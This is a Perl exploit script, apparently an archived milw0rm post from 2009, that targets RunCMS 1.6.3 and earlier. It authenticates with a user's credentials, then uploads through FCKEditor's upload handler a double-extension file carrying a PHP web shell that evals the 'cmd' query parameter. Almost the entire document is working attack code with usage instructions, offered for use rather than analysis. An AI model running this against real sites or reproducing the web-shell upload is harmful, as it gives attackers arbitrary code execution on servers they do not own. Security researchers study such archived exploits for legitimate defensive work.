#!/usr/bin/perl

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# RunCMS <= 1.6.3 "double ext" remote shell injection exploit #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
#                                                             #
# Note: you may upload files with double extension            #
#       FCKEditor must be enabled for users                   #
#                                                             #
#                                                             #
# by staker                                                   #
# ------------------------------                              #
# mail: staker[at]hotmail[dot]it                              #
# url: http://www.runcms.org                                  #
# ------------------------------                              #
# Discovered on 15 June 2009                                  #
# Happy Birthday Irene                                        #
# ----------------------------------------------------------- #


use IO::Socket;
use LWP::UserAgent;


cronx_us();

my ($host,$path,$username) = @ARGV;
my $password = $ARGV[3] || exit;
my $filename = "snippet.jpg.pwl"; # change it this is just an example

shell_up();

sub cronx_us() {

        print "[*------------------------------------------------------------*]\n".
              "[* RunCMS <= 1.6.3 (fckeditor) remote shell injection exploit *]\n".
              "[*------------------------------------------------------------*]\n".
              "[* Usage: perl web.pl [host] [path] [user] [pass]             *]\n".
              "[*                                                            *]\n".
              "[* Options:                                                   *]\n".
              "[* [host] insert a valid host                                 *]\n".
              "[* [path] insert a valid RunCMS path                          *]\n".
              "[* [user] your username                                       *]\n".
              "[* [pass] your password                                       *]\n".
              "[*------------------------------------------------------------*]\n";
}

sub login() {

    my $LWP = new LWP::UserAgent;

    my $post = $LWP->post(http_url($host)."/$path/user.php",
                         [ uname => $username,
                           pass  => $password,
                           op    => 'login',
                         ]) || die $!;

    if ($post->as_string =~ /Set-Cookie: (.*)/i) {
        return $1;
    }
}

sub http_url() {

    my $string = shift @_ || die($!);

    if ($string !~ /^http:\/\/?/i) {
       return 'http://'.$string;
    }
}


sub shell_up() {

     my ($data,$packet,$result);
     my $cookie = login();


     my $vector = chr(45) x27;
     my $socket = new IO::Socket::INET(
                                       PeerAddr => $host,
                                       PeerPort => 80,
                                       Proto    => 'tcp',
                                     ) or die $!;


     $data .= $vector."--uploading\r\n";
     $data .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"$filename\"\r\n";
     $data .= "Content-Type: unknown/unknown\r\n\r\n";
     $data .= "<?php error_reporting(E_ALL); if(isset(\$_GET['cmd'])){die(eval(stripslashes(\$_GET['cmd'])));} ?>\r\n";
     $data .= $vector."--uploading--\r\n";

     $packet .= "POST $path/class/fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.0\r\n";
     $packet .= "Content-Type: multipart/form-data; boundary=".$vector."uploading\r\n";
     $packet .= "Host: $host\r\n";
     $packet .= "Cookie: $cookie\r\n";
     $packet .= "User-Agent :Lynx (textmode)\r\n";
     $packet .= "Content-Length: ".length($data)."\r\n";
     $packet .= "Connection: Close\r\n\r\n";
     $packet .= $data;

     $socket->send($packet);

     foreach $result (<$socket>) {

          if ($result =~ /file uploader is disabled/i) {
             die("No access for you..\n");
          }
          else {
              print $result;
          }
     }
}


__END__

# milw0rm.com [2009-07-13]